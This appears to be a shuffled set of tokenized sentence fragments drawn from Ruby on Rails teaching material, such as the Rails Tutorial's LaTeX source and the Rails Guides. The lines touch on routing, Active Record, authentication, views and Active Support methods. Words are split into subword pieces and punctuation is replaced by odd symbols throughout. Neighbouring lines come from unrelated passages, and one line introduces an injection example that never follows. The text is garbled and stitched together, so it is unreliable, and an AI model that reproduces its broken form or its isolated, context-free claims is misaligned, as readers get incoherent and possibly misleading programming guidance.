▁d { code }╼\ end { code listing }╼╼ ╼\ subsection { S e tt ing ▁the ▁root ▁route } ▁% ▁( fold )╼\ label { sec : set ting _ the _ root _ route }╼╼
▁Call s ▁to ▁the ▁` render ` ▁method ▁generally ▁accept ▁four ▁options :
▁As ▁long ▁as ▁there ▁is ▁a ▁\ k ode { password \_ digest } ▁column ▁in ▁the ▁database , ▁adding ▁this ▁one ▁method ▁to ▁our ▁model ▁gives ▁us ▁a ▁secure ▁way ▁to ▁create ▁and ▁ authenticate ▁new ▁users .
▁` prev _ quarter ` ▁is ▁alias ed ▁to ▁` last _ quarter ` .
▁< h 1> Listing ▁ Book s </ h 1>
▁Create s ▁an ▁active ▁relationship ▁ associated ▁with ▁\ k ode { user } ▁( exception ▁on ▁failure )
▁In ▁this ▁section , ▁we ' ll ▁also ▁see ▁the ▁first ▁hint ▁of ▁a ▁\ emph { status ▁feed } --- a ▁not ion ▁br ough t ▁to ▁full ▁f ru it ion ▁in ▁Chapter ~\ ref { cha : following _ users } .
▁Fin ally , ▁we ▁need ▁to ▁add ▁\ k ode { picture } ▁to ▁the ▁list ▁of ▁attributes ▁ permitted ▁to ▁be ▁ modified ▁through ▁the ▁web .
▁ From ▁Rails ▁4▖0 ▁on ▁` delete ` ▁automatically ▁ tries ▁to ▁find ▁the ▁records ▁matching ▁the ▁given ▁id s ▁before ▁ deleting ▁them .
▁This ▁code , ▁which ▁uses ▁the ▁\ emph { order ed ▁list } ▁tag ~\ k ode { ol }, ▁is ▁responsib le ▁for ▁ generating ▁the ▁list ▁of ▁microposts , ▁but ▁you ▁can ▁see ▁that ▁it ▁just ▁def ers ▁the ▁heav y ▁ li f ting ▁to ▁a ▁micropost ▁partial .
▁ Adding ▁a ▁\ k ode { logged \_ in \_ user } ▁before ▁filter ▖
▁# ▁2▖ o d d ?
▁For ▁example , ▁to ▁retrieve ▁records ▁in ▁ batches ▁of ▁5 000 :
▁@ url ▁= ▁' http :// example ▖ com / login '
▁You ▁should ▁get ▁an ▁activation ▁email ▁as ▁implemented ▁in ▁Section ~\ ref { sec : account _ activations _ resource } ▁( Figure ~\ ref { fig : activation _ email _ production }) .
▁It ' s ▁also ▁worth ▁noting ▁that ▁this ▁chapter ▁saw ▁the ▁last ▁of ▁the ▁necessary ▁gem ▁installation s .
▁@ order _ id s ▁= ▁@ customer ▖ order _ id s
▁The ▁authentication ▁machinery ▁from ▁Chapter ~\ ref { cha : basic _ login } ▁will ▁allow ▁us ▁to ▁use ▁a ▁\ emph { before ▁filter } ▁to ▁ensure ▁that ▁this ▁is ▁the ▁case .
▁Now ▁if ▁you ▁try ▁to ▁create ▁a ▁new ▁article , ▁you ▁will ▁be ▁g re e ted ▁with ▁a ▁basic ▁HTTP ╼ Authentication ▁c hallenge :
▁Logging ▁in ▁and ▁remember ing ▁a ▁user .
▁ Cache - Control : ▁public , ▁ max - age = 25 92 000
▁With ▁the ▁routes ▁defined , ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁define ▁the ▁ stats ▁partial , ▁which ▁involve s ▁a ▁couple ▁of ▁links ▁inside ▁a ▁ div , ▁as ▁show n ▁in ▁Listing ~\ ref { code : stats _ partial } .
▁In ▁the ▁first ▁case , ▁you ▁can ▁simply ▁avoid ▁using ▁the ▁same ▁name ▁for ▁multiple ╼ routes ▖
▁" digest ":" a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 " }, " my _ image - 23 1 a 6 80 f 2 38 87 d 9 d d 7 07 10 ea 5 e fd 3 c 6 2▖ png ":{" logical _ path ":" my _ image ▖ png "," m time " : "2013-0 7-2 6 T 23 :00 : 27 - 07 :00 "," size " : 6 64 6 ,
▁Article ▖ where ( trashed : ▁true )▖ re where ( trashed : ▁false )
▁The ▁pattern ▁for ▁edit ing ▁user ▁information ▁close ly ▁parallel s ▁that ▁for ▁creating ▁new ▁users ▁( Chapter ~\ ref { cha : sign _ up }) .
▁In ▁the ▁case ▁of ▁an ▁ ir reversible ▁migration , ▁such ▁as ▁one ▁to ▁remove ▁a ▁database ▁column , ▁it ▁is ▁necessary ▁to ▁define ▁separate ▁\ k ode { up } ▁and ▁\ k ode { d own } ▁methods ▁in ▁place ▁of ▁the ▁single ▁\ k ode { change } ▁method .
▁t ▖ integer ▁: credit _ r ating
▁In ▁such ▁case ▁you ▁can ▁either ▁pass ▁`: authenticity _ token ▁=> ▁true ` ▁as ▁a ▁form ▁option ▁or ▁set ▁this ▁config ▁setting ▁to ▁` true `
▁ ec tion ▁a _ user _ object ▁( end )╼╼ ▁% ▁section ▁ ruby _ classes ▁( end )╼╼ ▁\ section { Co nclusion } ▁% ▁( fold )╼ ▁\ label { sec : co nclusion }╼╼
▁So , ▁instance s ▁can ▁change ▁the ▁class ▁attribute , ▁but ▁cannot ▁override ▁it ▁as ▁it ▁happens ▁with ▁` class _ attribute ` ▁( see ▁above )▖
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sessions _ resource } ▁( which ▁also ▁delete s ▁the ▁un ne ed ed ▁routes ▁generated ▁by ▁\ k ode { rails ▁generate ▁controller }) .
▁is ▁wrong .
▁But ▁actually ▁the ▁Rails ▁team ▁doesn ' t ▁want ▁users ▁to ▁rely ▁on ▁this ▁method ▖
▁# ▁config / initializers / secret _ token ▖ rb
▁In ▁the ▁present ▁case , ▁though , ▁say ing ▁`` 1 ▁microposts '' ▁is ▁un gr a m m at ical , ▁so ▁we ▁arrange ▁to ▁display ▁`` 1 ▁micropost '' ▁( but ▁`` 2 ▁microposts '') ▁using ▁\ k ode { pluralize } .
▁D is play s ▁an ▁image ▁which ▁when ▁click ed ▁will ▁submit ▁the ▁form .
▁d ▖ advance ( seconds : ▁1) ▖ advance ( months : ▁1)
▁For ▁example , ▁to ▁replace ▁the ▁entire ▁follow ▁form ▁with ▁the ▁string ▁\ k ode {" foobar " }, ▁we ▁would ▁write
▁You ▁can ▁ register ▁an ▁ interceptor ▁to ▁make ▁modification s ▁to ▁mail ▁messages ╼ right ▁before ▁they ▁are ▁hand ed ▁to ▁the ▁ delivery ▁a g ent s .
▁The ▁image ▁size ▁validations ▁in ▁Section ~\ ref { sec : image _ validation } ▁are ▁a ▁good ▁start , ▁but ▁they ▁ still ▁allow ▁the ▁upload ing ▁of ▁images ▁large ▁enough ▁to ▁break ▁our ▁site ' s ▁layout , ▁some times ▁with ▁f right en ing ▁results ▁( Figure ~\ ref { fig : large _ upload ed _ image }) .
▁#### ▁Other ▁Extensions
▁In ▁this ▁section , ▁we ' ll ▁be ▁running ▁the ▁tests ▁using ▁the ▁\ k ode { rspec } ▁command ▁supplied ▁by ▁the ▁RSpec ▁gem .
▁The ▁initial ▁working ▁feed ▖
▁* ▁Rails ▁4▖0 ▁has ▁removed ▁Action ▁and ▁P age ▁ caching ▁from ▁Action ▁Pack ▖
▁< h 1> Edit ing ▁ zone </ h 1>
▁# ▁< a ▁type =" integer "> 1 </ a >
▁ INNER ▁JOIN ▁tags ▁ ON ▁tags ▖ article _ id ▁= ▁articles ▖ id
▁< em > emph a size d </ em >
▁This ▁is ▁usually ▁implemented ▁by ╼ using ▁the ▁ decorator ▁pattern .
▁user ▖ save
▁te }╼╼ ▁% ▁subsection ▁a _ users _ resource ▁( end )╼╼ \ subsection { Debugger } ▁% ▁( fold )╼\ label { sec : debugger }╼╼
▁ Adding ▁password ▁reset ▁methods ▁to ▁the ▁User ▁model .
▁Because ▁of ▁the ▁\ k ode { user \_ id } ▁column ▁in ▁the ▁\ k ode { microposts } ▁table , ▁Rails ▁( using ▁Active ▁Record ) ▁can ▁infer ▁the ▁microposts ▁ associated ▁with ▁each ▁user .
▁Defaults ▁to ▁` false ` .
▁* ▁` ENV [" RAILS _ RE LA T I V E _ URL _ ROOT "] ` ▁is ▁used ▁by ▁the ▁routing ▁code ▁to ▁recognize ▁URLs ▁when ▁you ▁[ deploy ▁your ▁application ▁to ▁a ▁sub directory ]( configuring ▖ html # deploy - to - a - s ub directory - relative - url - root ) .
▁create _ table ▁: assemblies _ part s , ▁id : ▁false ▁do ▁| t |
▁The ▁reason ▁we ▁can ▁use ▁this ▁short er , ▁simple r ▁` form _ for ` ▁declaration ╼ to ▁stand ▁in ▁for ▁either ▁of ▁the ▁other ▁forms ▁is ▁that ▁`@ article ` ▁is ▁a ▁* resource * ╼ c or respond ing ▁to ▁a ▁full ▁set ▁of ▁RESTful ▁routes , ▁and ▁Rails ▁is ▁able ▁to ▁infer ╼ which ▁ URI ▁and ▁method ▁to ▁use .
▁A r range ▁for ▁such ▁users ▁to ▁be ▁ redirected ▁to ▁the ▁root ▁URL ▁if ▁they ▁do ▁try ▁to ▁hit ▁those ▁pages .
▁* ▁` load _ active _ support ` ▁ Requir es ▁` active _ support / dependencies ` ▁which ▁set s ▁up ▁the ▁basis ▁for ▁Active ▁Support ▖
▁delete ▁user ▁with ▁id ▁\ text tt {1}
▁* ▁Buil d ing ▁features ▁for ▁the ▁engine .
▁This ▁is ▁normal ▁for ▁a ▁collection ▁of ▁static ▁pages : ▁the ▁REST ▁architecture ▁isn ' t ▁the ▁best ▁solution ▁to ▁every ▁problem .
▁there by ▁mov ing ▁the ▁ condition al ▁from ▁the ▁end ▁of ▁the ▁line ▁to ▁an ▁if - end ▁statement .
▁ Admin s ▁can ▁delete ▁users ▁through ▁the ▁web ▁by ▁click ing ▁on ▁delete ▁links ▁that ▁issue ▁\ text tt { DELETE } ▁requests ▁to ▁the ▁Users ▁controller ▁\ k ode { destroy } ▁action .
▁ months _ ago
▁The ▁default ▁page ▁with ▁the ▁app ▁environment ▖ ~\ href { http :// railstutorial ▖ org / images / figures / riding _ rails _ environment _4_0 - full ▖ png }{( full ▁size )}
▁If ▁your ▁text ▁editor ▁does ▁not , ▁this ▁can ▁result ▁in ▁special ╼ ▁characters ▁that ▁you ▁enter ▁in ▁your ▁templates ▁( such ▁as ▁ é ) ▁to ▁appear ▁as ▁a ▁di a m on d ╼ ▁with ▁a ▁question ▁mark ▁inside ▁in ▁the ▁browser ▖
▁#### ▁ Options ▁for ▁` render `
▁As ▁we ' ll ▁see ▁in ▁Chapter ~\ ref { cha : sign _ up }, ▁it ' s ▁often ▁convenient ▁to ▁make ▁and ▁save ▁a ▁model ▁in ▁two ▁steps ▁as ▁we ▁have ▁above , ▁but ▁Active ▁Record ▁also ▁let s ▁you ▁combine ▁them ▁into ▁one ▁step ▁with ▁\ k ode { User ▖ create } :
▁For ▁example ▁this :
▁It ▁is ▁not ▁custom ary ▁in ▁Rails ▁to ▁run ▁the ▁full ▁test ▁suite ▁before ▁push ing ╼ change s ▖
▁RESTful ▁routes ▁provided ▁by ▁the ▁Microposts ▁resource ▁in ▁Listing ~\ ref { code : microposts _ resource } .
▁In side ▁a ▁test , ▁you ▁can ▁access ▁\ emph { instance } ▁variables ▁defined ▁in ▁the ▁controller ▁by ▁using ▁\ k ode { assigns } ▁with ▁the ▁corresponding ▁symbol .
▁the ▁corresponding ▁account ▁activation ▁link ' s ▁base ▁URL ▁will ▁look ▁like ▁this :
▁\ href { http :// guides ▖ rubyonrails ▖ org /}{ Rails ▁Guides } : ▁G ood ▁topic al ▁and ▁up - to - date ▁Rails ▁ references
▁This ▁command ▁will ▁generate ▁four ▁files :
▁This ▁is ▁a ▁`` remember ed ▁option '' , ▁which ▁means ▁that ▁we ▁don ' t ▁have ▁to ▁include ▁it ▁in ▁future ▁ invocation s ▁of ▁Bundler .
▁encoding : ▁ utf 8
▁# ▁== ▁ Schema ▁In form ation
▁One ▁way ▁to ▁fix ▁this ▁is ▁to ▁redirect ▁instead ▁of ▁rendering :
▁E verything ▁in ▁Ruby , ▁including ▁strings ▁and ▁even ▁\ k ode { nil }, ▁is ▁an ▁\ emph { object } .
▁### ▁` after _ bundle ` ▁in ▁Rails ▁templates
▁With ▁this ▁setup , ▁you ▁can ▁retrieve ▁`@ employee ▖ s ub or d in ate s ` ▁and ▁`@ employee ▖ manager ` .
▁invoke ▁scaffold _ controller
▁You ▁can ▁be ▁disable ▁prepar ed ▁statement s ▁by ▁setting ▁` prepare d _ state ment s ` ▁to ▁` false `:
▁This ▁guide ▁teach es ▁you ▁how ▁to ▁validate ▁the ▁state ▁of ▁objects ▁before ▁they ▁go ▁into ╼ the ▁database ▁using ▁Active ▁Record ' s ▁validations ▁feature .
▁\ chapter { A ▁toy ▁app } ▁% ▁( fold )╼\ label { cha : a _ toy _ app }╼╼
▁Article ▖ where ( published : ▁true )▖ any ?
▁* ▁A ▁[ g ood ▁security ▁blog ]( http :// ha ▖ c k ers ▖ org / blog / ) ▁including ▁the ▁[ C ross - Site ▁ script ing ▁C h e at ▁Sheet ]( http :// ha ▖ c k ers ▖ org / x s s ▖ html )
▁as ▁show n ▁in ▁Listing ~\ ref { code : current _ user _ working } .
▁Person ally , ▁I ▁power ed ▁through ▁the ▁\ emph { Rails ▁Tutorial } ▁in ▁three ▁long ▁day s , ▁doing ▁all ▁the ▁examples ▁and ▁c hallenge s ▁at ▁the ▁end ▁of ▁each ▁chapter .
▁# ▁Return s ▁true ▁if ▁the ▁collection ▁is ▁empty .
▁#### ▁The ▁D if f er ence ▁Be t we en ▁` render ` ▁and ▁` redirect _ to `
▁ private
▁Return s ▁a ▁stylesheet ▁link ▁tag ▁for ▁the ▁source s ▁specified ▁as ▁arguments ▖
▁#### ▁N est ed ▁Associations ▁ Hash
▁# ▁Note : ▁a ▁@ person ▁variable ▁will ▁have ▁been ▁created ▁in ▁the ▁controller ▁( e ▖ g ▖ ▁@ person ▁= ▁Person ▖ new )
▁Active ▁Record ▁provides ▁two ▁ lock ing ▁ mechanism s :
▁For ▁example , ▁we ' ll ▁convert
▁we ▁would ▁do :
▁Ou r ▁site ▁ authorization ▁is ▁complete ▁as ▁written , ▁but ▁there ▁is ▁one ▁minor ▁blemish : ▁when ▁users ▁try ▁to ▁access ▁a ▁ protected ▁page , ▁they ▁are ▁current ly ▁ redirected ▁to ▁their ▁profile ▁pages ▁regardless ▁of ▁where ▁they ▁were ▁try ing ▁to ▁go .
▁class ▁ Order ▁< ▁ActiveRecord :: Base
▁| ▁GET ▁| ▁ / photos / new ▁| ▁photos # new ▁| ▁new _ image _ path ▁|
▁The ▁second ▁method ▁look s ▁like ▁this :
▁self ▖ primary _ key ▁= ▁" person _ id "
▁# ▁Generate s ▁a ▁date ▁select ▁that ▁defaults ▁to ▁ today ▁( no ▁specified ▁date )
▁image _ tag (" icon ▖ png ") ▁# ▁=> ▁< img ▁src ="/ assets / icon ▖ png " ▁ alt =" I con " ▁/>
▁#### ▁` camelize `
▁Create ▁a ▁user ▁via ▁\ href { http :// a w s ▖ a mazon ▖ com / ia m /}{ A W S ▁I d entity ▁and ▁Access ▁ Management ▁( I A M )} ▁and ▁record ▁the ▁access ▁key ▁and ▁secret ▁key .
▁" foo "▖ duplicable ?
▁: discount _ cannot _ be _ greater _ than _ to t al _ value
▁E verything ▁this ▁generator ▁has ▁created ▁is ▁ ne at ly ▁namespaced ▖
▁The ▁method ▁` symbolize _ keys ` ▁returns ▁a ▁hash ▁that ▁has ▁a ▁ symbolize d ▁version ▁of ▁the ▁keys ▁in ▁the ▁receiver , ▁where ▁possible ▖
▁To ▁make ▁the ▁engine ' s ▁functionality ▁ accessible ▁from ▁within ▁an ▁application , ▁it ╼ ne ed s ▁to ▁be ▁m o un ted ▁in ▁that ▁application ' s ▁` config / routes ▖ rb ` ▁file :
▁date ▖ end _ of _ day ▁# ▁=> ▁Mon ▁Jun ▁ 07 ▁ 23:59:59 ▁+0200 ▁2010
▁You ' ll ▁see ▁how ▁to ▁use ▁these ▁a ▁little ╼ later .
▁We ▁created ▁our ▁first ▁controller , ▁the ▁Static ▁Pages ▁controller , ▁in ▁Section ~\ ref { sec : static _ pages } .
▁Do ▁yourself ▁a ▁favor ▁and ▁make ▁sure ▁your ▁test ▁cover age ▁is ▁good ▁ _ before _ ▁you ▁start ▁an ▁upgrade .
▁For ▁example , ▁if ▁you ▁take ▁a ▁look ▁back ▁at ▁Figure ~\ ref { fig : cloud 9 _ gemfile }, ▁you ' ll ▁see ▁a ▁small ▁vertical ▁line ▁on ▁the ▁right ▁to ▁help ▁keep ▁code ▁under ▁ 80 ▁characters .
▁# right _ menu ▁ { float : ▁right ; ▁background - color : ▁ y ellow ; ▁ color : ▁b la c k }
▁A lthough ▁our ▁`` remember ▁me '' ▁functionality ▁is ▁now ▁working , ▁it ' s ▁important ▁to ▁write ▁some ▁tests ▁to ▁verify ▁its ▁behavior .
▁Route ▁and ▁URL ▁m app ing ▁for ▁site ▁links .
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` stringify _ keys !` ▁that ▁string if ies ▁keys ▁in ▁the ▁very ▁receiver .
▁As ▁indicate d ▁in ▁Section ~\ ref { sec : remember _ me _ checkbox }, ▁as ▁the ▁application ▁is ▁current ly ▁design ed ▁there ' s ▁no ▁way ▁to ▁access ▁the ▁virtual ▁\ k ode { remember \_ token } ▁attribute ▁in ▁the ▁integration ▁test ▁in ▁Listing ~\ ref { code : remember _ me _ test } .
▁def ▁ welcome
▁The ▁toy ▁app ▁ developed ▁in ▁this ▁chapter ▁has ▁sever al ▁ strength s ▁and ▁a ▁host ▁of ▁we a k ness es .
▁in ▁Listing ~\ ref { code : demo _ users _ controller } .
▁The ▁final ▁part ▁of ▁the ▁layout ▁is ▁a ▁\ k ode { div } ▁for ▁the ▁main ▁content :
▁require ▁' other _ engine / engine '
▁The ▁primary ▁form ▁ builder ▁for ▁Rails ▁is ▁provided ▁by ▁a ▁helper ╼ method ▁called ▁` form _ for ` ▖
▁If ▁you ' re ▁new ▁to ▁this ▁g a me , ▁I ▁want ▁to ▁as sure ▁you ▁that ▁\ emph { s pending ▁time ▁learning ▁tool s ▁is ▁normal } .
▁In ▁our ▁case , ▁we ▁expect ▁the ▁\ k ode { full \_ title } ▁helper ▁to ▁be ▁used ▁on ▁all ▁the ▁site ' s ▁pages , ▁and ▁Rails ▁has ▁a ▁special ▁helper ▁file ▁for ▁this ▁case : ▁\ k ode { app / helpers / application \_ helper ▖ rb } .
▁S a y ▁you ▁have ▁4 ▁ initializers ▁called ▁" one " ▁through ▁" f our " ▁( defined ▁in ▁that ▁order ) ▁and ▁you ▁define ▁" f our " ▁to ▁go ▁ _ before _ ▁" f our " ▁but ▁ _ after _ ▁" th re e ", ▁that ▁just ▁isn ' t ▁ logical ▁and ▁Rails ▁will ▁not ▁be ▁able ▁to ▁determine ▁your ▁initializer ▁order .
▁ _ app _ setup ▁( end )╼╼ ▁\ section { Static ▁pages } ▁% ▁( fold )╼ ▁\ label { sec : static _ pages }╼╼
▁All ▁HTML ▁elements ▁can ▁be ▁as signed ▁both ▁classes ▁and ▁\ emph { id s } ; ▁these ▁are ▁me re ly ▁ label s , ▁and ▁are ▁useful ▁for ▁styling ▁with ▁CSS ▁( Section ~\ ref { sec : custom _ css }) .
▁=> ▁#< User : 0 x 22 4 ce ec ▁@ email = nil , ▁@ name = nil >
▁S el ec t ▁`` Show ▁hidden ▁files '' ▁to ▁show ▁the ▁\ k ode { ▖ gitignore } ▁file ▁in ▁the ▁application ' s ▁root ▁directory ▁( Figure ~\ ref { fig : show _ hidden _ file s }) .
▁Next , ▁we ' ll ▁add ▁a ▁Rake ▁task ▁to ▁create ▁sample ▁users .
▁We ▁can ▁see ▁how ▁this ▁works ▁by ▁replacing ▁the ▁literal ▁title ▁`` Home '' ▁in ▁the ▁\ k ode { home ▖ html ▖ erb } ▁view ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : home _ view _ erb _ title } .
▁put ▁: update _ name , ▁on : ▁: member
▁This ▁\ k ode { index } ▁action ▁has ▁the ▁line ▁\ k ode {@ users ▁= ▁User ▖ all } ▁( Step ~ 3 ), ▁which ▁as k s ▁the ▁User ▁model ▁to ▁retrieve ▁a ▁list ▁of ▁all ▁the ▁users ▁from ▁the ▁database ▁( Step ~ 4 ), ▁and ▁then ▁place s ▁them ▁in ▁the ▁variable ▁\ k ode {@ users } ▁( pronoun c ed ▁`` at - users '') ▁( Step ~ 5 ) .
▁a 2▖ x ▁= ▁2
▁ BigDecimal ▖ new ( 5▖0 0, ▁6 )▖ to _ formatted _ s ▁# ▁=> ▁" 5▖0 "
▁The ▁first ▁step ▁is ▁to ▁think ▁of ▁the ▁kind ▁of ▁query ▁we ' ll ▁need .
▁ { a : ▁1, ▁b : ▁2, ▁c : ▁3 } ▖ sum ▁# ▁=> ▁ [: b , ▁2, ▁: c , ▁3 , ▁: a , ▁1 ]
▁As ▁part ▁of ▁ generating ▁the ▁mailer , ▁Rails ▁also ▁generates ▁two ▁view ▁templates ▁for ▁each ▁mailer , ▁one ▁for ▁plain - text ▁email ▁and ▁one ▁for ▁HTML ▁email .
▁Guard ▁m on it or s ▁changes ▁in ▁the ▁file system ▁so ▁that , ▁for ▁example , ▁when ▁we ▁change ▁the ▁\ k ode { static \_ pages \_ controller \_ test ▖ rb } ▁file , ▁only ▁those ▁tests ▁get ▁run .
▁In ▁particular , ▁the ▁first ▁route ▁in ▁Table ~\ ref { table : RESTful _ password _ resets } ▁gives ▁a ▁link ▁to ▁the ▁`` forgot ▁password '' ▁form ▁via
▁The ▁relationships ▁in ▁Listing ~\ ref { code : user _ relationships _ association } ▁and ▁Listing ~\ ref { code : relationship _ belongs _ to } ▁give ▁ ri se ▁to ▁methods ▁analogous ▁to ▁the ▁one s ▁we ▁saw ▁in ▁Table ~\ ref { table : association _ methods }, ▁as ▁show n ▁in ▁Table ~\ ref { table : association _ methods _ relationships } .
▁#### ▁ radio _ button
▁To ▁ speed ▁this ▁up , ▁we ▁can ▁open ▁a ▁d ed icated ▁terminal ▁window , ▁navigate ▁to ▁the ▁application ▁root ▁directory , ▁and ▁then ▁start ▁a ▁Spork ▁server :
▁We ▁can ▁test ▁for ▁this ▁by ▁first ▁destroying ▁a ▁micropost ' s ▁user ▁and ▁then ▁verify ing ▁that ▁the ▁ associated ▁microposts ▁are ▁no ▁longer ▁in ▁the ▁database .
▁as ▁show n ▁in ▁Listing ~\ ref { code : signin _ upon _ signup } .
▁as ▁seen ▁in ▁Listing ~\ ref { code : protected _ edit _ update _ tests } .
▁== ▁Create Comments : ▁migrat ing ▁= ================ ================ ================
▁As ▁we ' ll ▁see ▁in ▁Section ~\ ref { sec : signup _ success }, ▁the ▁key ▁to ▁creating ▁a ▁user ▁is ▁the ▁special ▁\ k ode { name } ▁attribute ▁in ▁each ▁\ k ode { input } :
▁The ▁page ▁to ▁show ▁a ▁user ▁(\ href { http :// localhost :3000/ users /1}{/ users /1 }) .
▁Of ▁course , ▁even ▁the ▁ subselect ▁won ' t ▁ scale ▁for ever .
▁The ▁` render ` ▁method ▁here ▁is ▁tak ing ▁a ▁very ▁simple ▁hash ▁with ▁a ▁key ▁of ▁` plain ` ▁and ╼ value ▁of ▁` params [: article ] ▖ inspect ` ▖
▁Verify ▁that ▁the ▁login ▁link ▁disappear s .
▁var ▁= ▁boolean ? ▁?
▁| ▁app / models / comment ▖ rb ▁| ▁The ▁ Comment ▁model ▁|
▁( As ▁in ▁Section ~\ ref { sec : deploying }, ▁you ▁may ▁see ▁some ▁ warning ▁messages , ▁which ▁you ▁should ▁ignore ▁for ▁now .
▁Extensions ▁to ▁` Module `
▁For ▁instance , ▁` attributes ` ▁or ▁` connect ion ` ▁are ▁ bad ▁names ▁for ▁associations .
▁ Gem ▁ dependencies ▁inside ▁an ▁engine ▁should ▁be ▁specified ▁inside ▁the ▁` ▖ gem spec ` ▁file ╼ at ▁the ▁root ▁of ▁the ▁engine ▖
▁De s p ite ▁its ▁name , ▁\ k ode { response ▖ body } ▁contains ▁the ▁full ▁HTML ▁source ▁of ▁the ▁page ▁( and ▁not ▁just ▁the ▁page ' s ▁ body ) .
▁For ▁c r im in al ▁ha c k ers , ▁it ▁is ▁very ▁ attr active ▁to ▁ exploit ▁an ▁SQL - In j ec tion ▁ vulnerabilit y ▁in ▁a ▁web ▁application ▁framework ▁and ▁insert ▁ malicious ▁code ▁in ▁every ▁text u al ▁table ▁column ▖
▁The ▁syntax ▁is ▁ potentially ▁confusing , ▁and ▁it ' s ▁important ▁to ▁understand ▁that ▁in
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁> ▁10 ▁OR DER ▁BY ▁id ▁DESC
▁" hello "▖ at ( - 1 ) ▁# ▁=> ▁" o "
▁### ▁Creat ing ▁articles
▁A lt er na tive ly , ▁a ▁request ▁for ▁a ▁file ▁with ▁an ▁M D 5 ▁hash ▁such ▁as ╼` public / assets / rails - a f 27 b 6 a 4 14 e 6 d a 0 000 3 50 3 1 48 be 9 b 4 0 9 ▖ png ` ▁is ▁treat ed ▁the ▁same ╼ way ▖
▁Web ▁application ▁development ▁is ▁hard , ▁and ▁it ▁help s ▁to ▁learn ▁from ▁the ▁experience ▁( and ▁mistake s ) ▁of ▁other s .
▁When ▁using ▁`: default s `, ▁if ▁an ▁` application ▖ js ` ▁file ▁exists ▁in ▁your ▁` app / assets / javascripts ` ▁directory , ▁it ▁will ▁be ▁included ▁as ▁well .
▁The ▁Home ▁page ▁with ▁a ▁new ▁micropost ▁form .
▁Code ▁to ▁get ▁a ▁passing ▁test ▁for ▁the ▁Help ▁page .
▁In ▁our ▁previous ▁model ▁tests , ▁we ' ve ▁main ly ▁used ▁\ k ode { User ▖ new }, ▁which ▁just ▁creates ▁a ▁Ruby ▁object ▁in ▁memory , ▁but ▁for ▁uniqueness ▁tests ▁we ▁actually ▁need ▁to ▁put ▁a ▁record ▁into ▁the ▁database
▁So ▁this ▁kind ▁of ▁injection ▁was ▁possible :
▁* ▁The ▁` delete ` ▁method ▁in ▁collection ▁associations ▁can ▁now ▁receive ▁` Fi x n um ` ▁or ▁` String ` ▁arguments ▁as ▁record ▁id s , ▁be side s ▁records , ▁ pretty ▁much ▁like ▁the ▁` destroy ` ▁method ▁does ▖
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / array / group ing ▖ rb ` .
▁One ▁way ▁to ▁avoid ▁ deep ▁nesting ▁( as ▁recommended ▁above ) ▁is ▁to ▁generate ▁the ▁collection ▁actions ▁scope d ▁under ▁the ▁ parent , ▁so ▁as ▁to ▁get ▁a ▁sense ▁of ▁the ▁hierarchy , ▁but ▁to ▁not ▁ n est ▁the ▁ member ▁actions ▖
▁<%= ▁comment ▖ body ▁%>
▁With ▁the ▁\ k ode { digest } ▁method ▁from ▁Listing ~\ ref { code : digest _ method }, ▁we ▁are ▁now ▁ready ▁to ▁create ▁a ▁user ▁fixture ▁for ▁a ▁valid ▁user , ▁as ▁show n ▁in ▁Listing ~\ ref { code : real _ user _ fixture } .
▁Return s ▁the ▁sub string ▁of ▁the ▁string ▁starting ▁at ▁position ▁` position `:
▁To ▁enforce ▁a ▁particular ▁order , ▁we ' ll ▁include ▁the ▁\ k ode { order } ▁argument ▁in ▁\ k ode { default \_ scope }, ▁which ▁let s ▁us ▁order ▁by ▁the ▁\ k ode { created \_ at } ▁column ▁as ▁follows :
▁This ▁custom ▁validation ▁arrange s ▁to ▁call ▁the ▁method ▁corresponding ▁to ▁the ▁given ▁symbol ▁(\ k ode { : picture \_ size }) .
▁In ▁this ▁section , ▁we ' ll ▁pro ve ▁that ▁the ▁compar is on ▁for ▁password ▁ expiration ▁in ▁Section ~\ ref { sec : reset ting _ the _ password } ▁is ▁correct .
▁T h r ough out ▁this ▁section , ▁we ' ll ▁proceed ▁through ▁a ▁series ▁of ▁feed ▁implementation s ▁of ▁increasing ▁ sophistication .
▁use ▁ ActionDispatch :: Cookie s
▁We ▁can ▁also ▁concatenate ▁strings ▁with ▁the ▁\ k ode { + } ▁operator :
▁TIP : ▁ _ Re source s ▁should ▁ never ▁be ▁nested ▁more ▁than ▁1 ▁level ▁ deep ▖ _
▁Find ▁an ▁online ▁version ▁of ▁the ▁Ruby ▁API ▁and ▁read ▁about ▁the ▁\ k ode { Hash } ▁method ▁\ k ode { merge } .
▁In ▁that ▁section , ▁we ▁used ▁a ▁\ k ode { before \_ save } ▁callback ; ▁this ▁time , ▁we ' ll ▁use ▁the ▁close ly ▁related ▁\ k ode { before \_ create } ▁callback ▁to ▁set ▁the ▁remember ▁token ▁when ▁the ▁user ▁is ▁first ▁created
▁Note ▁that ▁the ▁Git ▁output ▁f r equ ent ly ▁includes ▁things ▁like ▁\ k ode { 34 f 06 b 7 }, ▁which ▁are ▁related ▁to ▁Git ' s ▁ internal ▁representation ▁of ▁repositories .
▁To ▁get ▁started , ▁we ' ll ▁create ▁a ▁file ▁in ▁the ▁\ k ode { feature s / } ▁directory ▁called ▁\ k ode { signing \_ in ▖ feature } .
▁Action ▁Mailer ▁allows ▁you ▁to ▁send ▁email s ▁from ▁your ▁application ▁using ▁mailer ▁classes ╼ and ▁views ▖
▁in ▁Listing ~\ ref { code : will _ paginate _ gem } .
▁The ▁method ▁` re define _ method ` ▁prevent s ▁such ▁a ▁ po t en tial ▁ warning , ▁remov ing ▁the ▁existing ▁method ▁before ▁if ▁needed .
▁ Mo v ing ▁the ▁\ k ode { signed \_ in \_ user } ▁method ▁into ▁the ▁Sessions ▁helper .
▁This ▁module ▁provides ▁methods ▁for ▁ generating ▁ container ▁tags , ▁such ▁as ▁` div `, ▁for ▁your ▁record ▖
▁| ▁| ▁30 4 ▁| ▁: not _ modified ▁|
▁The ▁first ▁step ▁in ▁our ▁refactoring ▁is ▁to ▁replace ▁the ▁user ~\ k ode { li } ▁from ▁Listing ~\ ref { code : will _ paginate _ index _ view } ▁with ▁a ▁\ k ode { render } ▁call ▁( Listing ~\ ref { code : index _ view _ first _ refactoring }) .
